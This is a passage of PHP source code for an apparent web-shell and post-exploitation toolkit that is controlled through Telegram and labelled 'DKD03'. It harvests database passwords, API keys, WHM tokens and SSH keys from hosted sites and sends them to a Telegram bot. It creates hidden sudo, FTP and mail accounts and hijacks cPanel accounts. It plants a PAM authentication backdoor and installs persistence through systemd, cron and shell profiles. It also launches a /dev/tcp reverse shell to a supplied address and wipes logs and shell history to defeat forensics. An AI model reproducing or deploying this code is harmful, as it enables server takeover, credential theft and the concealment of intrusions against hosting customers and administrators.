            if (!empty($db_name[1])) $creds[] = "   DB_NAME: " . $db_name[1];
            if (!empty($db_user[1])) $creds[] = "   DB_USER: " . $db_user[1];
            if (!empty($db_pass[1])) $creds[] = "   DB_PASS: " . $db_pass[1];
            if (!empty($db_host[1])) $creds[] = "   DB_HOST: " . $db_host[1];
            
            // Cek versi WordPress
            if (file_exists($root . '/wp-includes/version.php')) {
                $v_content = @file_get_contents($root . '/wp-includes/version.php');
                if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
                    $creds[] = "   Version: " . $v_match[1];
                }
            }
            
            // Cek plugin yang terinstall
            $plugins_dir = $root . '/wp-content/plugins';
            if (is_dir($plugins_dir)) {
                $plugins = @scandir($plugins_dir);
                if ($plugins !== false) {
                    $active_plugins = [];
                    foreach ($plugins as $plugin) {
                        if ($plugin != '.' && $plugin != '..' && is_dir($plugins_dir . '/' . $plugin)) {
                            $active_plugins[] = $plugin;
                        }
                    }
                    if (!empty($active_plugins)) {
                        $creds[] = "   Plugins: " . implode(', ', array_slice($active_plugins, 0, 5));
                        if (count($active_plugins) > 5) $creds[] = "   ... dan " . (count($active_plugins) - 5) . " lainnya";
                    }
                }
            }
            
            $found[] = implode("\n", $creds);
        }
        
        // ===== SCAN LARAVEL =====
        if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
            $env_content = file_get_contents($root . '/.env');
            $creds = [];
            
            preg_match_all('/([A-Z_]+)\s*=\s*(.+)/', $env_content, $matches);
            
            $creds[] = "📁 Laravel: $root";
            if (!empty($matches[1])) {
                foreach ($matches[1] as $i => $key) {
                    $key = trim($key);
                    $value = trim($matches[2][$i] ?? '');
                    if (strpos($key, 'DB_') !== false || 
                        strpos($key, 'PASS') !== false || 
                        strpos($key, 'KEY') !== false ||
                        strpos($key, 'SECRET') !== false ||
                        strpos($key, 'TOKEN') !== false) {
                        $creds[] = "   $key: $value";
                    }
                }
            }
            
            if (preg_match('/APP_ENV\s*=\s*(.+)/', $env_content, $env_match)) {
                $creds[] = "   APP_ENV: " . trim($env_match[1]);
            }
            
            if (preg_match('/APP_DEBUG\s*=\s*(.+)/', $env_content, $debug_match)) {
                $creds[] = "   APP_DEBUG: " . trim($debug_match[1]);
            }
            
            $found[] = implode("\n", $creds);
        }
    }
    
    if (empty($found)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel.");
        return [];
    }
    
    $msg = "📊 *WordPress/Laravel Scan Results*\n\n" . implode("\n\n", $found);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $found;
}

// ==================== FIND SENSITIVE FILES ====================
function find_sensitive_files() {
    global $botToken, $telegramUserId;
    $found = [];
    $patterns = [
        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', '/configuration.php'
    ];
    $roots = get_all_document_roots_cached();
    
    foreach ($roots as $root) {
        if (!is_dir($root)) continue;
        foreach ($patterns as $pattern) {
            $files = @glob($root . $pattern);
            if ($files !== false) {
                foreach ($files as $file) {
                    if (is_file($file) && is_readable($file)) {
                        $size = formatSize(filesize($file));
                        $found[] = $file . " (" . $size . ")";
                    }
                }
            }
        }
    }
    
    if (empty($found)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif.");
        return [];
    }
    
    $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $found;
}

// ==================== CPANEL HARVEST (REAL) ====================
function cpanel_harvest() {
    global $botToken, $telegramUserId;
    $found = [];
    $roots = get_all_document_roots_cached();
    
    // Cari file .env, wp-config.php, config.php
    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php'];
    
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_readable($root)) continue;
        
        foreach ($config_files as $file) {
            $path = $root . '/' . $file;
            if (file_exists($path) && is_readable($path)) {
                $content = file_get_contents($path);
                
                // Extract credentials
                $patterns = [
                    '/(DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|APP_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
                    '/define\(\s*[\'"]?(DB_PASSWORD|DB_PASS)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
                ];
                
                foreach ($patterns as $pattern) {
                    preg_match_all($pattern, $content, $matches);
                    if (!empty($matches[1]) && !empty($matches[2])) {
                        foreach ($matches[1] as $i => $key) {
                            $found[] = "📁 " . basename($path) . " - " . $key . ": " . trim($matches[2][$i]);
                        }
                    }
                }
            }
        }
    }
    
    // Cari di /home/*/.accesshash
    if (function_exists('shell_exec')) {
        $home_dirs = @glob('/home/*');
        if ($home_dirs !== false) {
            foreach ($home_dirs as $home) {
                $accesshash = $home . '/.accesshash';
                if (file_exists($accesshash) && is_readable($accesshash)) {
                    $hash = file_get_contents($accesshash);
                    $found[] = "📁 " . basename($home) . " - AccessHash: " . trim($hash);
                }
            }
        }
    }
    
    if (empty($found)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial.");
        return [];
    }
    
    $msg = "🔑 *Credential Harvest Results*\n\n" . implode("\n", $found);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $found;
}

// ==================== SSH KEYS GRABBER (REAL) ====================
function grab_ssh_keys() {
    global $botToken, $telegramUserId;
    $keys = [];
    
    if (function_exists('shell_exec')) {
        // Cek semua user di /home
        $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
        foreach ($users as $user) {
            $user = trim($user);
            if (empty($user)) continue;
            
            $auth = "/home/$user/.ssh/authorized_keys";
            if (file_exists($auth) && is_readable($auth)) {
                $content = file_get_contents($auth);
                if (!empty(trim($content))) {
                    $keys[] = "👤 User: $user\n" . $content;
                }
            }
        }
        
        // Cek root
        if (file_exists('/root/.ssh/authorized_keys') && is_readable('/root/.ssh/authorized_keys')) {
            $content = file_get_contents('/root/.ssh/authorized_keys');
            if (!empty(trim($content))) {
                $keys[] = "👤 User: root\n" . $content;
            }
        }
    }
    
    if (empty($keys)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys.");
        return [];
    }
    
    $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $keys;
}

// ==================== CPANEL MODULE (REAL) ====================
function is_cpanel_installed() {
    if (file_exists('/usr/local/cpanel/version')) return true;
    if (file_exists('/usr/local/cpanel/cpanel')) return true;
    if (file_exists('/usr/local/cpanel')) return true;
    
    // Cek port cPanel
    $ports = [2082, 2083, 2086, 2087, 2095, 2096];
    foreach ($ports as $port) {
        $sock = @fsockopen('127.0.0.1', $port, $errno, $errstr, 1);
        if ($sock) {
            fclose($sock);
            return true;
        }
    }
    
    return false;
}

function get_whm_token() {
    $token_locations = [
        '/root/.accesshash',
        '/root/.cpanel/whm_token',
        '/home/*/.cpanel/whm_token',
        '/etc/cpanel/whm_token',
        '/usr/local/cpanel/whm_token',
        '/var/cpanel/whm_token',
        '/root/.cpanel/token'
    ];
    
    foreach ($token_locations as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $file) {
                if (is_file($file) && is_readable($file)) {
                    $content = @file_get_contents($file);
                    if ($content) {
                        $content = trim($content);
                        if (preg_match('/[a-f0-9]{64}/i', $content, $match)) {
                            return $match[0];
                        }
                        if (preg_match('/[a-f0-9]{32}/i', $content, $match)) {
                            return $match[0];
                        }
                        if (strlen($content) > 20) {
                            return $content;
                        }
                    }
                }
            }
        }
    }
    
    $env_token = getenv('WHM_TOKEN');
    if ($env_token) return $env_token;
    
    return false;
}

function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
    $token = get_whm_token();
    if (!$token) {
        return ['error' => 'WHM token tidak ditemukan'];
    }
    
    if (!function_exists('curl_init')) {
        return ['error' => 'CURL tidak tersedia'];
    }
    
    $url = "https://127.0.0.1:2087/json-api/" . $endpoint . "?" . http_build_query($params);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: whm ' . $token]);
    curl_setopt($ch, CURLOPT_USERAGENT, 'DKD03-API/1.0');
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    if ($response === false) {
        return ['error' => 'Gagal terhubung: ' . $curlError];
    }
    
    if ($httpCode !== 200) {
        return ['error' => 'HTTP Error: ' . $httpCode];
    }
    
    $data = json_decode($response, true);
    if (!isset($data['data'])) {
        return ['error' => 'Respon tidak valid'];
    }
    
    return $data['data'];
}

function cpanel_list_accounts() {
    $data = cpanel_api_request('listaccts');
    
    if (isset($data['error'])) {
        return "❌ " . $data['error'];
    }
    
    if (!isset($data['acct']) || empty($data['acct'])) {
        return "❌ Tidak ada akun ditemukan.";
    }
    
    $accounts = [];
    foreach ($data['acct'] as $acct) {
        $accounts[] = "- " . $acct['user'] . " (domain: " . $acct['domain'] . ", plan: " . $acct['plan'] . ")";
    }
    
    return "📋 *cPanel Accounts*\n\n" . implode("\n", $accounts);
}

function cpanel_create_account($username, $domain, $password, $plan = 'default') {
    $params = [
        'username' => $username,
        'domain' => $domain,
        'password' => $password,
        'plan' => $plan,
        'contactemail' => $username . '@' . $domain
    ];
    
    $result = cpanel_api_request('createacct', $params, 'POST');
    
    if (isset($result['error'])) {
        return "❌ " . $result['error'];
    }
    
    return "✅ Akun berhasil dibuat:\nUsername: $username\nDomain: $domain\nPassword: $password";
}

function cpanel_change_password($username, $newPassword) {
    $params = ['user' => $username, 'pass' => $newPassword];
    $result = cpanel_api_request('passwd', $params, 'POST');
    
    if (isset($result['error'])) {
        return "❌ " . $result['error'];
    }
    
    return "✅ Password berhasil diubah untuk $username";
}

function cpanel_backup_account($username) {
    $params = ['user' => $username];
    $result = cpanel_api_request('backup', $params, 'POST');
    
    if (isset($result['error'])) {
        return "❌ " . $result['error'];
    }
    
    return "✅ Backup akun $username sedang diproses.";
}

function cpanel_delete_account($username, $keepfiles = '0') {
    $params = ['user' => $username, 'keepfiles' => $keepfiles];
    $result = cpanel_api_request('removeacct', $params, 'POST');
    
    if (isset($result['error'])) {
        return "❌ " . $result['error'];
    }
    
    return "✅ Akun $username berhasil dihapus.";
}

function cpanel_handler($action, $username = '', $extra = '') {
    if (!is_cpanel_installed()) {
        return "❌ cPanel/WHM tidak terdeteksi di server ini.";
    }
    
    $token = get_whm_token();
    if (!$token) {
        return "❌ WHM token tidak ditemukan.\n\n"
             . "Cara mendapatkan token:\n"
             . "1. Login ke WHM sebagai root\n"
             . "2. Buka: Home > Development > Manage API Tokens\n"
             . "3. Klik 'Generate Token'\n"
             . "4. Beri nama dan pilih 'All Functions'\n"
             . "5. Klik 'Generate'\n"
             . "6. Copy token yang muncul\n"
             . "7. Simpan di /root/.cpanel/whm_token";
    }
    
    switch ($action) {
        case 'list':
            return cpanel_list_accounts();
        case 'create':
            if (empty($username) || empty($extra)) {
                return "❌ Format: create [username] [domain] [password] [plan]\n"
                     . "Contoh: create testuser test.com Pass123@ default";
            }
            $parts = explode(' ', $extra);
            $domain = $parts[0] ?? '';
            $password = $parts[1] ?? 'password123';
            $plan = $parts[2] ?? 'default';
            return cpanel_create_account($username, $domain, $password, $plan);
        case 'passwd':
            if (empty($username) || empty($extra)) {
                return "❌ Format: passwd [username] [passwordbaru]";
            }
            return cpanel_change_password($username, $extra);
        case 'backup':
            if (empty($username)) {
                return "❌ Format: backup [username]";
            }
            return cpanel_backup_account($username);
        case 'delete':
            if (empty($username)) {
                return "❌ Format: delete [username] [keepfiles?]";
            }
            $keep = ($extra == 'keep') ? '1' : '0';
            return cpanel_delete_account($username, $keep);
        default:
            return "❌ Aksi tidak dikenali.\n"
                 . "Gunakan: list, create, passwd, backup, delete";
    }
}

// ==================== BACKDOOR USER ====================
function create_backdoor_user($username, $password) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
    
    $output = @shell_exec("useradd -m -s /bin/bash " . escapeshellarg($username) . " 2>&1");
    if (strpos($output, 'exists') !== false) {
        return "⚠️ User $username sudah ada.";
    }
    
    @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>&1");
    @shell_exec("usermod -aG sudo " . escapeshellarg($username) . " 2>&1");
    @shell_exec("usermod -aG wheel " . escapeshellarg($username) . " 2>&1");
    
    $uid = @shell_exec("id -u " . escapeshellarg($username) . " 2>&1");
    
    return "✅ User $username created\nPassword: $password\nUID: $uid";
}

// ==================== LIST SPREAD FILES ====================
function list_spread_files() {
    global $botToken, $telegramUserId;
    $found = [];
    $myFile = basename(__FILE__);
    $roots = get_all_document_roots_cached();
    
    foreach ($roots as $root) {
        $path = $root . '/' . $myFile;
        if (file_exists($path)) {
            $found[] = $path;
        }
    }
    
    if (empty($found)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan.");
        return [];
    }
    
    $msg = "📋 *Spread Files*\n\n" . implode("\n", $found);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $found;
}

// ==================== RANSOMWARE CREATOR ====================
function create_ransomware() {
    global $botToken, $telegramUserId;
    
    $code = '<?php
echo "💀 RANSOMWARE DKD03\n";
echo "File terenkripsi: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
echo "Password: Dkd03Ransom2025\n";
?>';
    
    $file = __DIR__ . '/R.php';
    @file_put_contents($file, $code);
    @chmod($file, 0644);
    
    $url = "http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/R.php";
    
    sendTelegramMessage($botToken, $telegramUserId, "💀 Ransomware created:\n📁 $file\n🔗 $url");
    return true;
}

// ==================== SELF DESTRUCT ====================
function self_destruct_ultimate() {
    global $botToken, $telegramUserId;
    sendTelegramMessage($botToken, $telegramUserId, "💀 Self destruct executed!");
    @unlink(__FILE__);
    session_destroy();
    exit;
}

// ==================== ANTI FORENSIC ====================
function anti_forensic_ultimate() {
    global $botToken, $telegramUserId;
    $results = [];
    
    $logs = [
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure'
    ];
    
    foreach ($logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            $size = @filesize($log);
            if ($size !== false && $size > 0) {
                @file_put_contents($log, str_repeat("\x00", $size));
            }
            @unlink($log);
            $results[] = "Cleaned: $log";
        }
    }
    
    // Clear history
    if (function_exists('shell_exec')) {
        @shell_exec('history -c 2>/dev/null');
        @shell_exec('unset HISTFILE 2>/dev/null');
        $results[] = "Command history cleared";
    }
    
    $msg = "🧹 *Anti Forensic*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

// ==================== BYPASS SUHOSIN ====================
function bypass_suhosin() {
    global $botToken, $telegramUserId;
    
    $disabled = ini_get('disable_functions');
    $open_basedir = ini_get('open_basedir');
    $suhosin_eval = ini_get('suhosin.executor.disable_eval');
    
    $msg = "🛡️ *Suhosin Status*\n\n"
         . "Disabled Functions: " . ($disabled ?: 'none') . "\n"
         . "open_basedir: " . ($open_basedir ?: 'none') . "\n"
         . "suhosin.executor.disable_eval: " . ($suhosin_eval ? 'ON' : 'OFF') . "\n\n";
    
    // Coba bypass methods
    $methods = [];
    if (function_exists('dl') && !in_array('dl', explode(',', $disabled))) {
        $methods[] = 'dl()';
    }
    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', $disabled))) {
        $methods[] = 'pcntl_exec()';
    }
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', $disabled))) {
        $methods[] = 'proc_open()';
    }
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', $disabled))) {
        $methods[] = 'shell_exec()';
    }
    
    if (!empty($methods)) {
        $msg .= "✅ Available bypass methods:\n" . implode("\n", $methods);
    } else {
        $msg .= "❌ No bypass methods available.";
    }
    
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => $msg];
}

// ==================== FTP ACCOUNT CREATOR ====================
function create_ftp_account($username, $password, $home = '') {
    global $botToken, $telegramUserId;
    
    $home = $home ?: '/home/' . $username;
    $results = [];
    
    if (function_exists('shell_exec')) {
        // PureFTPd
        if (file_exists('/usr/bin/pure-pw')) {
            @shell_exec("echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home) . " 2>/dev/null");
            @shell_exec('pure-pw mkdb 2>/dev/null');
            $results[] = "PureFTPd account created";
        }
        
        // vsftpd
        if (file_exists('/etc/vsftpd.conf')) {
            $userlist = '/etc/vsftpd.userlist';
            if (file_exists($userlist) && is_writable($userlist)) {
                @file_put_contents($userlist, $username . "\n", FILE_APPEND);
                @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>/dev/null");
                $results[] = "vsftpd account created";
            }
        }
    }
    
    if (empty($results)) {
        $results[] = "Tidak ada FTP server terdeteksi";
    }
    
    $msg = "📂 *FTP Account*\nUsername: $username\nPassword: $password\nHome: $home\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    
    return ['success' => true, 'msg' => "✅ FTP account $username created"];
}

// ==================== MAIL ACCOUNT CREATOR ====================
function create_mail_account($email, $password, $domain = '') {
    global $botToken, $telegramUserId;
    
    $domain = $domain ?: $_SERVER['HTTP_HOST'];
    $username = explode('@', $email)[0];
    $results = [];
    
    if (function_exists('shell_exec')) {
        // Postfix + Dovecot
        if (file_exists('/usr/bin/doveadm') && file_exists('/etc/postfix/virtual')) {
            @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
            @file_put_contents('/etc/postfix/virtual', "$email $username@$domain\n", FILE_APPEND);
            @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
            @shell_exec('postfix reload 2>/dev/null');
            $results[] = "Postfix virtual account created";
        }
        
        // Exim
        if (file_exists('/usr/sbin/exim')) {
            $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
            if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
            $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
            if ($hash) {
                @file_put_contents($exim_user, $username . ':' . trim($hash) . '::' . $domain . "\n", FILE_APPEND);
                $results[] = "Exim account created";
            }
        }
    }
    
    if (empty($results)) {
        $results[] = "Tidak ada mail server terdeteksi";
    }
    
    $msg = "📧 *Mail Account*\nEmail: $email\nPassword: $password\nDomain: $domain\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    
    return ['success' => true, 'msg' => "✅ Mail account $email created"];
}

// ==================== DEEP PERSISTENCE ====================
function install_deep_persistence() {
    global $botToken, $telegramUserId;
    $results = [];
    
    if (!isRoot()) {
        return ['success' => false, 'msg' => "❌ Harus root"];
    }
    
    if (function_exists('shell_exec')) {
        // Systemd service
        $service = '[Unit]
Description=DKD Cache
After=network.target

[Service]
Type=simple
ExecStart=php ' . __FILE__ . ' --daemon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target';
        
        @file_put_contents('/etc/systemd/system/dkd.service', $service);
        @shell_exec('systemctl daemon-reload 2>/dev/null');
        @shell_exec('systemctl enable dkd.service 2>/dev/null');
        @shell_exec('systemctl start dkd.service 2>/dev/null');
        $results[] = "✅ Systemd service installed";
        
        // Cron job
        $cron = "*/5 * * * * php " . __FILE__ . " > /dev/null 2>&1";
        @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
        $results[] = "✅ Cron job installed";
        
        // rc.local
        if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
            $rc = file_get_contents('/etc/rc.local');
            $rc = str_replace('exit 0', '', $rc);
            $rc .= "\nphp " . __FILE__ . " --daemon &\nexit 0\n";
            @file_put_contents('/etc/rc.local', $rc);
            @chmod('/etc/rc.local', 0755);
            $results[] = "✅ rc.local updated";
        }
    }
    
    $msg = "💀 *Deep Persistence*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    
    return ['success' => true, 'msg' => implode("\n", $results)];
}

function remove_deep_persistence() {
    @shell_exec('systemctl stop dkd.service 2>/dev/null');
    @shell_exec('systemctl disable dkd.service 2>/dev/null');
    @unlink('/etc/systemd/system/dkd.service');
    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
    
    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
        $rc = file_get_contents('/etc/rc.local');
        $rc = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $rc);
        $rc = preg_replace('/--daemon.*\n/', '', $rc);
        @file_put_contents('/etc/rc.local', $rc);
    }
    
    return ['success' => true, 'msg' => "✅ Deep persistence removed"];
}

// ==================== USER PERSISTENCE ====================
function user_persistence_install() {
    global $botToken, $telegramUserId;
    $results = [];
    $home = getenv('HOME') ?: __DIR__;
    
    // Bashrc
    $bashrc = $home . '/.bashrc';
    if (file_exists($bashrc) && is_writable($bashrc)) {
        $content = file_get_contents($bashrc);
        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
        @file_put_contents($bashrc, $content);
        $results[] = "✅ .bashrc updated";
    }
    
    // Profile
    $profile = $home . '/.profile';
    if (file_exists($profile) && is_writable($profile)) {
        $content = file_get_contents($profile);
        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
        @file_put_contents($profile, $content);
        $results[] = "✅ .profile updated";
    }
    
    // User cron
    $cron = "*/10 * * * * php " . __FILE__ . " > /dev/null 2>&1";
    @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
    $results[] = "✅ User cron installed";
    
    $msg = "💀 *User Persistence*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    
    return ['success' => true, 'msg' => implode("\n", $results)];
}

function user_persistence_remove() {
    $home = getenv('HOME') ?: __DIR__;
    
    // Clean bashrc
    $bashrc = $home . '/.bashrc';
    if (file_exists($bashrc) && is_writable($bashrc)) {
        $content = file_get_contents($bashrc);
        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
        @file_put_contents($bashrc, $content);
    }
    
    // Clean profile
    $profile = $home . '/.profile';
    if (file_exists($profile) && is_writable($profile)) {
        $content = file_get_contents($profile);
        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
        @file_put_contents($profile, $content);
    }
    
    // Remove cron
    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
    
    return ['success' => true, 'msg' => "✅ User persistence removed"];
}

// ==================== PAM BYPASS ====================
function pam_bypass_install($password = 'BackdoorPass123') {
    global $botToken, $telegramUserId;
    
    if (!isRoot()) {
        return ['success' => false, 'msg' => "❌ Harus root"];
    }
    
    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
    $modified = [];
    
    foreach ($pam_files as $file) {
        if (file_exists($file) && is_writable($file)) {
            $content = file_get_contents($file);
            $lines = explode("\n", $content);
            $new_lines = [];
            $found = false;
            
            foreach ($lines as $line) {
                if (strpos($line, 'pam_unix.so') !== false && strpos($line, 'sufficient') === false && strpos($line, '#') !== 0) {
                    $new_lines[] = "auth sufficient pam_permit.so # DKD_BACKDOOR";
                    $found = true;
                }
                $new_lines[] = $line;
            }
            
            if ($found) {
                @file_put_contents($file, implode("\n", $new_lines));
                $modified[] = $file;
            }
        }
    }
    
    if (empty($modified)) {
        return ['success' => false, 'msg' => "❌ Tidak ada file PAM yang dimodifikasi"];
    }
    
    $msg = "🔑 *PAM Bypass*\nPassword: $password\nModified: " . implode(', ', $modified);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    
    return ['success' => true, 'msg' => "✅ PAM bypass installed\nPassword: $password"];
}

function pam_bypass_remove() {
    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
    
    foreach ($pam_files as $file) {
        if (file_exists($file) && is_writable($file)) {
            $content = file_get_contents($file);
            $content = preg_replace('/auth sufficient pam_permit\.so # DKD_BACKDOOR\n/', '', $content);
            @file_put_contents($file, $content);
        }
    }
    
    return ['success' => true, 'msg' => "✅ PAM bypass removed"];
}

// ==================== REVERSE SHELL ====================
function start_reverse_shell($ip, $port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
    
    $script = "/tmp/rshell_$port.sh";
    $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
    @file_put_contents($script, $content);
    @chmod($script, 0755);
    @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
    
    sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ Reverse shell ke $ip:$port dimulai");
    return true;
}

function stop_reverse_shell($port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
    @shell_exec("pkill -f 'rshell_$port' 2>/dev/null");
    return "✅ Reverse shell port $port dihentikan";
}

function status_reverse_shell() {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
    $output = @shell_exec("ps aux | grep rshell_ | grep -v grep");
    return empty($output) ? "❌ Tidak ada reverse shell aktif" : "✅ Reverse shell aktif:\n$output";
}

// ==================== CLEAR LOGS ADVANCED ====================
function clean_logs_advanced() {
    $logs = [
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
        '/var/log/messages', '/var/log/mysql/error.log'
    ];
    
    $count = 0;
    foreach ($logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
            $count++;
        }
    }
    
    // Clear command history
    if (function_exists('shell_exec')) {
        @shell_exec('history -c 2>/dev/null');
        @shell_exec('unset HISTFILE 2>/dev/null');
    }
    
    return "✅ Logs cleaned ($count files) + history cleared";
}

// ==================== ONE CLICK ALL (TANPA WORM) ====================
function one_click_all_without_worm() {
    global $botToken, $telegramUserId;
    $results = [];
    $start_time = microtime(true);
    
    // 1. SPOOF IP
    $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254)];
    $_SERVER['HTTP_X_FORWARDED_FOR'] = $fake_ips[array_rand($fake_ips)];
    $_SERVER['HTTP_CLIENT_IP'] = $fake_ips[array_rand($fake_ips)];
    $_SERVER['HTTP_X_REAL_IP'] = $fake_ips[array_rand($fake_ips)];
    $_SERVER['REMOTE_ADDR'] = $fake_ips[array_rand($fake_ips)];
    $results[] = "✅ IP Headers Spoofed";
    
    // 2. SPOOF UA
    $uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ];
    $random_ua = $uas[array_rand($uas)];
    ini_set('user_agent', $random_ua);
    putenv("HTTP_USER_AGENT=$random_ua");
    $_SERVER['HTTP_USER_AGENT'] = $random_ua;
    $results[] = "✅ User-Agent Spoofed";
    
    // 3. CLEAR LOGS
    $logs = [
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
        '/var/log/messages', '/var/log/lastlog', '/var/log/wtmp', '/var/log/btmp'
    ];
    $cleared_logs = 0;
    foreach ($logs as $log) {
        if (file_exists($log)) {
            if (is_writable($log)) { @file_put_contents($log, ''); $cleared_logs++; }
            else { @chmod($log, 0666); @file_put_contents($log, ''); $cleared_logs++; }
        }
    }
    $results[] = "✅ Logs Cleared: $cleared_logs files";
    
    // 4. CLEAR HISTORIES
    if (function_exists('shell_exec')) {
        @shell_exec('history -c 2>/dev/null');
        @shell_exec('unset HISTFILE 2>/dev/null');
        $users = ['root'];
        $home_users = @shell_exec('ls /home 2>/dev/null');
        if ($home_users) $users = array_merge($users, array_filter(explode("\n", trim($home_users))));
        $cleared_hist = 0;
        foreach ($users as $user) {
            $home = ($user === 'root') ? '/root' : "/home/$user";
            foreach (['.bash_history', '.zsh_history', '.mysql_history'] as $hf) {
                $path = $home . '/' . $hf;
